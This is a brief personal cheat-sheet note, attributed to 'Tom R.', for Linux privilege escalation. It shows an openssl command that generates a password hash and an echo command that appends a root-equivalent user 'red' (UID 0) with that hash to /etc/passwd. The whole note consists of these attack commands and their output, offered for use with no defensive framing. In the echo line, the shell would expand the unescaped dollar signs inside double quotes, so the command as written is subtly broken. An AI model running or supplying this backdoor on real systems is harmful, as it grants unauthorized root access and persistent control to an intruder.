# Entered by Tom R.  20231224

# Manually create a user entry in /passwd for priv esc.

# Generate Password String
openssl passwd Password123
$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1

# Manually add password and user to /etc/passwd

echo "red:$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1:0:0:root:/root:/bin/bash" >> /etc/passwd
